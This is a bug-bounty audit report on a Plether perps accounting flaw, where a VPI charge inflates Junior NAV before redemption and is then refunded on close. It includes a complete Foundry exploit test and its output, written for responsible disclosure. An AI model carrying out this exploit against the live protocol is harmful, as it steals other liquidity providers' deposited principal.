# \#97657 [SC-Critical] Positive VPI is booked into Junior LP NAV but refunded on close, so a Junior LP redeems the lift and takes other LPs' deposited funds

**Submitted on Nov 2nd 2026 at 15:39:41 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97657
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An order that raises pool skew pays a VPI charge. That charge is transferred into HousePool as Revenue and added to the Junior principal at the next LP-epoch settlement, which raises Junior NAV per share. The close of the same position refunds the charge in full through the lifetime-VPI clamp. One wallet funds a Junior LP position and a trader account, queues a redemption of its Junior shares, opens a skew position to lift Junior NAV, lets the epoch settle so the redemption is priced and funded at the lifted NAV, then closes the position to reclaim the charge. In one epoch the attacker withdraws 7,971.162625 USDG more than it deposited and a passive Junior LP redeems 22,770.982269 USDG less than it deposited.

## Vulnerability Details

The value moves in this order.

1. The attacker opens a skew-raising LONG. The settlement sidecar transfers the non-fee part of the VPI charge into HousePool and records it as Revenue with the cash already arrived (`CfdEngineSettlementSidecar.sol:454-462`). In the PoC the charge is 68,451.221 USDG and the pool's USDG balance rises by that amount.
2. At LP-epoch settlement, `_settleLpEpoch` reconciles that revenue into `juniorPrincipal` and then prices the matured Junior redemption from the post-reconcile principal (`HousePool.sol:835`, `:840-841`). Junior NAV per share rises from 0.999990867612915 to 1.000675366726925.
3. The redemption is funded out of `juniorPrincipal` at the lifted NAV (`HousePool.sol:886`). The attacker redeems 55,000,000 USDG of shares for 55,037,647.780010 USDG.
4. The attacker closes the position. `CloseAccountingLib` computes the close VPI as a rebate, and the lifetime clamp caps it at the exact charge the open accrued, so the pool refunds the whole charge (`CloseAccountingLib.sol:103-104`, `:116-118`). The close receipt records `vpiAssets: -68451221000`, the negative of the open charge. The trade nets zero VPI, and the lift the attacker banked at redemption is paid back out of the principal the remaining Junior LPs hold.

No guard ties a Junior redemption to the lifetime of the VPI that raised its price. The NAV view adds the charge as revenue with no set-aside for the refund the close pays.

### Vulnerable source code

**1. The open's VPI charge is transferred into the pool and recorded as Junior revenue @ CfdEngineSettlementSidecar.sol:454-462**
```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
```

**2. Reconcile folds the revenue into juniorPrincipal, then prices the redemption from it @ HousePool.sol:835-841**
```solidity
_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();

result.cutoffEpoch = cutoffEpoch;
RedemptionPhase memory juniorPhase;
juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
```

**3. The matured Junior redemption is funded out of juniorPrincipal @ HousePool.sol:886**
```solidity
juniorPrincipal -= juniorPhase.fundedAssets;
```

**4. The position carries the accrued lifetime VPI charge @ CloseAccountingLib.sol:103-104**
```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
```

**5. The close clamp caps the rebate at the accrued charge, refunding it in full @ CloseAccountingLib.sol:116-118**
```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

## Impact Details

- Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield. The passive Junior LP deposited 45,000,000.000000 USDG and redeemed 44,977,229.017731 USDG, a loss of 22,770.982269 USDG. The attacker deposited 56,000,000.000000 USDG and withdrew 56,007,971.162625 USDG, a gain of 7,971.162625 USDG. Total USDG across every account is 101,002,000.000000 before and after, so the attacker's gain is a transfer out of Junior principal.
- The loss is deposited principal, not unclaimed yield. The Junior tranche held no accrued earnings at the victim's entry NAV near 1.0, and the victim redeems for less than it deposited.
- Every attacker action is permissionless. Junior deposits are uncapped (`TrancheVault.sol:1325`), the redemption uses `requestRedeem` and `claimRedeem`, the position uses `OrderRouter.commitOrder` and `executeOrder`, and `executeOrder` has no caller gate (`OrderRouter.sol:240`). The attacker self-executes its own open, so the open bounty is released back to it.
- The victim sees a lower NAV at the end of an epoch. The lift and its reversal both land inside the settlement window.
- The attack repeats every epoch. Nothing gates an open on a matured redemption, and the mark never moves.
- Dedup. The listed reports carry a VPI depth scan item and VPI notes in SECURITY.md. The program's rule: "For findings marked as fixed or Acknowledged in the reports above, a report on the same root cause is valid only if it shows that the fix at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 is incomplete or introduces a new bug." The documented clamp note covers a trader's own rebate-only round trip. This report is a Junior LP redeeming the NAV lift between the open and the close, paid from other LPs' principal, which the clamp enables.

## References

- CfdEngineSettlementSidecar.sol:454-462 - open VPI charge transferred to HousePool as Revenue/CashArrived
- HousePool.sol:835 - reconcile folds revenue into juniorPrincipal before any price is read
- HousePool.sol:840-841 - Junior redemption priced from the post-reconcile principal
- HousePool.sol:886 - Junior redemption funded out of juniorPrincipal
- CloseAccountingLib.sol:103-104 - accrued lifetime VPI on the position
- CloseAccountingLib.sol:116-118 - clamp refunds the accrued charge at close
- OrderRouter.sol:240 - executeOrder has no caller gate
- TrancheVault.sol:1325 - Junior deposits are uncapped

## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/30b32c30158da62c9cb36470dd1b5aea

## Proof of Concept

## Proof of Concept

The PoC runs in the repo's Foundry suite at the in-scope commit (`src` equals `a82d4fef`, tag `v2.0.0`; this checkout `6909f261` has the same `src`, `script`, `lib` and `foundry.toml`). It uses the release parameters in `packages/perps/DEPLOYMENT.md`, deploys every in-scope contract, drives them through their production entry points, and reads each impact number from protocol state after real tokens move. It proves one permissionless cycle leaves the attacker above its deposit and a passive Junior LP below its deposit.

Full PoC directory and raw logs (secret gist): https://gist.github.com/decies-centena-millia/30b32c30158da62c9cb36470dd1b5aea

Place the file at `packages/perps/test/perps/poc/VpiLiftRedeemThenRefund.t.sol` and run from `packages/perps`:

```bash
forge test --match-path "test/perps/poc/VpiLiftRedeemThenRefund.t.sol" -vv
```

### attack step-by-step

1. The attacker funds a Junior LP position of 55,000,000 USDG and a trader account of 1,000,000 USDG. A passive LP funds 45,000,000 USDG.
2. After the deposit cooldown, the attacker queues a redemption of its whole Junior stake for the next epoch with `requestRedeem`.
3. The attacker opens a 37,000,700 USDG LONG at full depth with `commitOrder` and self-executed `executeOrder`. The VPI charge of 68,451.221 USDG enters the pool as Junior revenue and lifts NAV.
4. The epoch settles with `settleLpEpoch`. The redemption is funded at the lifted NAV and the attacker claims 55,037,647.780010 USDG with `claimRedeem`.
5. The attacker closes the position. The clamp refunds the 68,451.221 USDG charge into the attacker's trader balance, which it withdraws.
6. The passive LP exits one epoch later and redeems 44,977,229.017731 USDG for its 45,000,000 USDG deposit.

```
plant : attacker holds Junior shares and queues their redemption for the next epoch
fire  : open to lift Junior NAV, claim the redemption at the lift, close to reclaim the VPI charge
```

## main Attack code

### full poc code, single file, single runnable command

VpiLiftRedeemThenRefund.t.sol
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

contract VpiLiftRedeemThenRefundTest is BasePerpTest {

    address internal constant ATTACKER = address(0xA11CE); // acts as a Junior LP AND as a trader (one owner)
    address internal constant VICTIM = address(0xB0B); // a passive Junior LP who stays across the cycle

    // Junior stakes. Attacker holds the majority so it banks the larger share of the lift; both are below the
    // pool's free-cash withdrawal capacity so the attacker can fully realize its redemption in one epoch.
    uint256 internal constant ATTACKER_JUNIOR = 55_000_000e6;
    uint256 internal constant VICTIM_JUNIOR = 45_000_000e6;
    // Trader collateral for the single skew position (returned in full at close; net cost is only the fees).
    uint256 internal constant ATTACKER_TRADER = 1_000_000e6;

    uint256 internal constant PRICE = 1e8; // mark held flat at 1.00 for the whole cycle -> isolate the VPI lift

    // On-chain release parameters (packages/perps/DEPLOYMENT.md "Initial release parameters").
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    // Control every non-seed deposit explicitly.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_vpiLift_juniorRedeemThenRefund_stealsFromPassiveLPs() public {
        // Phase 0. Two Junior LPs fund the pool through the real async deposit path. The Base helpers mint 1:1 and
        // fully deposit, so each actor's committed USDG equals its deposit constant.
        _fundJunior(VICTIM, VICTIM_JUNIOR);
        _fundJunior(ATTACKER, ATTACKER_JUNIOR);
        _fundTrader(ATTACKER, ATTACKER_TRADER);

        uint256 attackerCapitalIn = ATTACKER_JUNIOR + ATTACKER_TRADER;
        uint256 victimCapitalIn = VICTIM_JUNIOR;

        assertEq(settlementToken.balanceOf(ATTACKER), 0, "attacker starts with no loose USDG");
        assertEq(settlementToken.balanceOf(VICTIM), 0, "victim starts with no loose USDG");

        console2.log("=============== PHASE 0: deposits (USDG, 6dp) ===============");
        console2.log(" attacker junior deposit       :", ATTACKER_JUNIOR);
        console2.log(" attacker trader deposit       :", ATTACKER_TRADER);
        console2.log(" victim   junior deposit       :", VICTIM_JUNIOR);
        console2.log(" pool.totalAssets()            :", pool.totalAssets());
        console2.log(" attacker junior shares        :", juniorVault.balanceOf(ATTACKER));
        console2.log(" victim   junior shares        :", juniorVault.balanceOf(VICTIM));
        console2.log(" attacker junior value (c2a)   :", juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER)));
        console2.log(" victim   junior value (c2a)   :", juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM)));

        // Total USDG across every account. No USDG is minted or burned after this point, so the sum is invariant:
        // whatever the attacker ends up with above its deposit was moved off another account.
        uint256 systemUsdgBefore = _systemUSDG();
        console2.log(" SYSTEM USDG (all accounts)    :", systemUsdgBefore);

        // Move to a clean epoch >=2h past the attacker's deposit activation so the 1h deposit cooldown elapsed, and
        // land 60s into a fresh LP epoch so a redeem request matures at the next hourly boundary.
        uint256 cd = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        uint256 t = ((cd / 1 hours) + 1) * 1 hours + 60;
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);

        // Phase 1. The attacker queues a redemption of its whole Junior stake for the imminent epoch, before the lift.
        uint256 attackerShares = juniorVault.maxRequestRedeem(ATTACKER);
        assertEq(attackerShares, juniorVault.balanceOf(ATTACKER), "cooldown elapsed: whole stake is redeemable");
        vm.prank(ATTACKER);
        uint256 redeemEpoch = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        uint256 redeemSettleTime = pool.lpEpochStart(redeemEpoch);
        console2.log("=============== PHASE 1: redeem queued ======================");
        console2.log(" attacker shares queued        :", attackerShares);
        console2.log(" redeem epoch id               :", redeemEpoch);
        console2.log(" redeem settles at ts          :", redeemSettleTime);
        console2.log(" junior NAV/share now (1e18 c2a):", juniorVault.convertToAssets(1e18));

        // Phase 2. The attacker opens a skew-raising LONG at full depth through the real router. The positive VPI
        // charge is booked as pool Revenue into the Junior principal, lifting NAV. The mark stays at 1.00. The
        // attacker self-executes, so the open bounty is released back to it.
        uint256 depthAtOpen = pool.totalAssets();
        uint256 notional = depthAtOpen * 37 / 100; // ~37% of depth, below maxSkewRatio 40%
        uint256 size = notional * 1e20 / PRICE;
        size = (size / 1e20) * 1e20; // whole lots (SIZE_QUANTUM = 1e20)

        uint256 navBeforeOpen = juniorVault.convertToAssets(1e18);
        uint256 poolCashBeforeOpen = settlementToken.balanceOf(address(pool));

        // Margin above initMargin + the VPI charge + the fee so equity clears the initial-margin gate. All of it is
        // returned at close, so it does not change the attacker's net.
        vm.prank(ATTACKER);
        uint64 openId = router.commitOrder(CfdTypes.Side.LONG, size, 300_000e6, PRICE, false);
        bytes[] memory ud = _mockPythUpdateData(PRICE);
        vm.prank(ATTACKER);
        router.executeOrder(openId, ud);

        uint256 navAfterOpen = juniorVault.convertToAssets(1e18);
        (uint256 pSize, uint256 pMargin,,,,, int256 pVpi) = engine.positions(ATTACKER);
        console2.log("=============== PHASE 2: skew open (VPI lift) ===============");
        console2.log(" depth at open                 :", depthAtOpen);
        console2.log(" commit order id               :", uint256(openId));
        console2.log(" position size (1e18 tokens)   :", size);
        console2.log(" OPENED position size          :", pSize);
        console2.log(" OPENED position margin        :", pMargin);
        console2.log(" OPENED position vpiAccrued    :");
        console2.logInt(pVpi);
        console2.log(" attacker trader bal after open:", clearinghouse.balanceAssets(ATTACKER));
        console2.log(" router pending orders(attacker):", router.pendingOrderCounts(ATTACKER));
        console2.log(" junior NAV/share before open  :", navBeforeOpen);
        console2.log(" junior NAV/share after  open  :", navAfterOpen);
        console2.log(" pool USDG cash gained on open :", settlementToken.balanceOf(address(pool)) - poolCashBeforeOpen);
        assertGt(navAfterOpen, navBeforeOpen, "VPI charge must lift Junior NAV before the redeem is priced");

        // Phase 3. Settle the LP epoch at the hourly boundary. The matured redemption is priced from the lifted
        // principal and funded, then the attacker claims its USDG.
        vm.warp(redeemSettleTime);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(PRICE, uint64(vm.getBlockTimestamp()));
        _settleLpEpochForTest();

        uint256 claimable = juniorVault.claimableRedeemRequest(redeemEpoch, ATTACKER);
        assertEq(claimable, attackerShares, "the whole queued stake must be funded (under free-cash capacity)");
        vm.prank(ATTACKER);
        uint256 redeemedAssets = juniorVault.claimRedeem(redeemEpoch, claimable, ATTACKER, ATTACKER);
        console2.log("=============== PHASE 3: redeem funded & claimed ============");
        console2.log(" junior NAV/share at settle    :", juniorVault.convertToAssets(1e18));
        console2.log(" attacker USDG from redeem      :", redeemedAssets);
        console2.log(" attacker junior shares left    :", juniorVault.balanceOf(ATTACKER));
        assertGt(redeemedAssets, ATTACKER_JUNIOR, "attacker redeems for MORE USDG than it deposited (banked the lift)");

        // Phase 4. The attacker closes the whole position. The lifetime-VPI clamp refunds exactly the charge
        // (CloseAccountingLib.sol:116-118): the pool pays it back out to the attacker's trader balance.
        uint256 traderBalBeforeClose = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, size, 0, 0, true);
        bytes[] memory ud2 = _mockPythUpdateData(PRICE);
        vm.prank(ATTACKER);
        router.executeOrder(closeId, ud2);

        (uint256 sizeAfter,,,,,,) = engine.positions(ATTACKER);
        assertEq(sizeAfter, 0, "position fully closed");
        console2.log("=============== PHASE 4: close (VPI refund) =================");
        console2.log(" trader balance before close   :", traderBalBeforeClose);
        console2.log(" trader balance after  close   :", clearinghouse.balanceAssets(ATTACKER));

        uint256 traderBalFinal = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, traderBalFinal);

        // Phase 5. The passive victim exits in full one epoch later (no open positions) at the post-attack NAV.
        uint256 vShares = juniorVault.maxRequestRedeem(VICTIM);
        assertEq(vShares, juniorVault.balanceOf(VICTIM), "victim's whole stake is redeemable");
        vm.prank(VICTIM);
        uint256 vEpoch = juniorVault.requestRedeem(vShares, VICTIM, VICTIM);
        vm.warp(pool.lpEpochStart(vEpoch));
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(PRICE, uint64(vm.getBlockTimestamp()));
        _settleLpEpochForTest();
        uint256 vClaimable = juniorVault.claimableRedeemRequest(vEpoch, VICTIM);
        vm.prank(VICTIM);
        juniorVault.claimRedeem(vEpoch, vClaimable, VICTIM, VICTIM);

        // Impact. Read realized USDG from ERC20 balances; compare to the USDG each actor put in.
        uint256 attackerFinalWallet = settlementToken.balanceOf(ATTACKER);
        uint256 victimFinalWallet = settlementToken.balanceOf(VICTIM);

        int256 attackerNet = int256(attackerFinalWallet) - int256(attackerCapitalIn);
        int256 victimNet = int256(victimFinalWallet) - int256(victimCapitalIn);

        console2.log("================= IMPACT: Direct theft of user funds =================");
        console2.log(" ATTACKER capital in (USDG 6dp):", attackerCapitalIn);
        console2.log(" ATTACKER realized wallet USDG :", attackerFinalWallet);
        console2.log(" ATTACKER net (realized-in)    :");
        console2.logInt(attackerNet);
        console2.log(" VICTIM   deposited PRINCIPAL  :", victimCapitalIn);
        console2.log(" VICTIM   redeemed back        :", victimFinalWallet);
        console2.log(" VICTIM   net (realized-in)    :");
        console2.logInt(victimNet);
        // The victim is a Junior LP whose deposit sat at ~1.0 NAV with no accrued yield; it redeems for LESS USDG
        // than it deposited. The shortfall is deposited principal, not forgone yield.
        console2.log(" VICTIM principal lost (not yield), USDG:");
        console2.logInt(-victimNet);
        console2.log(" attacker residual junior shares:", juniorVault.balanceOf(ATTACKER));
        console2.log(" attacker residual trader bal   :", clearinghouse.balanceAssets(ATTACKER));
        uint256 systemUsdgAfter = _systemUSDG();
        console2.log(" SYSTEM USDG before             :", systemUsdgBefore);
        console2.log(" SYSTEM USDG after              :", systemUsdgAfter);
        console2.log("======================================================================");

        assertEq(juniorVault.balanceOf(ATTACKER), 0, "attacker fully exited its Junior stake");
        assertEq(clearinghouse.balanceAssets(ATTACKER), 0, "attacker fully exited its trader account");
        assertEq(systemUsdgAfter, systemUsdgBefore, "no USDG minted/burned: the attacker's gain is a pure transfer");
        assertGt(attackerNet, int256(0), "ATTACKER realized a net profit in USDG");
        // Deposited principal is impaired: the victim recovers strictly less USDG than it deposited. The Junior
        // tranche carried no accrued yield at the victim's entry NAV (~1.0), so this is at-rest principal, not
        // unclaimed yield.
        assertLt(
            victimFinalWallet,
            victimCapitalIn,
            "VICTIM recovers LESS than its deposited principal: principal loss, not unclaimed yield"
        );
    }

    /// @dev Sum of USDG across every protocol contract and both actors. Invariant after Phase 0, so it anchors the
    ///      conservation argument in raw ERC20 state.
    function _systemUSDG() internal view returns (uint256) {
        return settlementToken.balanceOf(ATTACKER) + settlementToken.balanceOf(VICTIM)
            + settlementToken.balanceOf(address(this)) + settlementToken.balanceOf(address(pool))
            + settlementToken.balanceOf(address(clearinghouse)) + settlementToken.balanceOf(address(juniorVault))
            + settlementToken.balanceOf(address(seniorVault)) + settlementToken.balanceOf(engine.protocolTreasury())
            + settlementToken.balanceOf(address(engine));
    }

}
```

### Output

Console readout from the `-vv` run, verbatim:

```
  =============== PHASE 2: skew open (VPI lift) ===============
   depth at open                 : 100002000000000
   commit order id               : 1
   position size (1e18 tokens)   : 37000700000000000000000000
   OPENED position size          : 37000700000000000000000000
   OPENED position margin        : 179747799000
   OPENED position vpiAccrued    :
  68451221000
   attacker trader bal after open: 916748499000
   router pending orders(attacker): 0
   junior NAV/share before open  : 999990867612915
   junior NAV/share after  open  : 1000675366726925
   pool USDG cash gained on open : 68451221000
  =============== PHASE 3: redeem funded & claimed ============
   junior NAV/share at settle    : 1000675366637163
   attacker USDG from redeem      : 55037647780010
   attacker junior shares left    : 0
  =============== PHASE 4: close (VPI refund) =================
   trader balance before close   : 916748499000
   trader balance after  close   : 970323382615
  ================= IMPACT: Direct theft of user funds =================
   ATTACKER capital in (USDG 6dp): 56000000000000
   ATTACKER realized wallet USDG : 56007971162625
   ATTACKER net (realized-in)    :
  7971162625
   VICTIM   deposited PRINCIPAL  : 45000000000000
   VICTIM   redeemed back        : 44977229017731
   VICTIM   net (realized-in)    :
  -22770982269
   VICTIM principal lost (not yield), USDG:
  22770982269
   attacker residual junior shares: 0
   attacker residual trader bal   : 0
   SYSTEM USDG before             : 101002000000000
   SYSTEM USDG after              : 101002000000000
  ======================================================================

[PASS] test_vpiLift_juniorRedeemThenRefund_stealsFromPassiveLPs() (gas: 13523623)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 76.74ms (51.07ms CPU time)
```

Protocol-emitted lines from the full call trace (`-vvvv`), verbatim. The open books the VPI charge as pool Revenue; the two settlements fund the attacker at the lifted NAV and the victim below its deposit; the open and close receipts carry the charge and its exact negative:

```
HousePool::recordClaimantInflow(68451221000 [6.845e10], 0, 0)

emit LpEpochSettled(cutoffEpoch: 474875 [4.748e5], seniorRedeemAssets: 0, juniorRedeemAssets: 55037647780010 [5.503e13], juniorDepositAssets: 0, seniorDepositAssets: 0, seniorBacklog: false, juniorBacklog: false, entriesDeferred: false)

emit LpEpochSettled(cutoffEpoch: 474876 [4.748e5], seniorRedeemAssets: 0, juniorRedeemAssets: 44977229017731 [4.497e13], juniorDepositAssets: 0, seniorDepositAssets: 0, seniorBacklog: false, juniorBacklog: false, entriesDeferred: false)
```

Open order receipt economics (substring), verbatim:

```
realizedPnlAssets: 0, vpiAssets: 68451221000 [6.845e10], carryAssets: 0, executionFeeAssets: 14800280000 [1.48e10]
```

Close order receipt economics (substring), verbatim. The close VPI is the exact negative of the open charge, with zero realized P&L:

```
realizedPnlAssets: 0, vpiAssets: -68451221000 [-6.845e10], carryAssets: 76057385 [7.605e7], executionFeeAssets: 14800280000 [1.48e10]
```

```
    account     deposited (USDG)   realized (USDG)      delta (USDG)
    VICTIM      45,000,000.000000  44,977,229.017731   -22,770.982269
    ATTACKER    56,000,000.000000  56,007,971.162625    +7,971.162625

  22,770.982269 USDG of the passive Junior LP's deposited principal left its account; the attacker withdrew 7,971.162625 USDG more than it put in, and total USDG is unchanged.
```

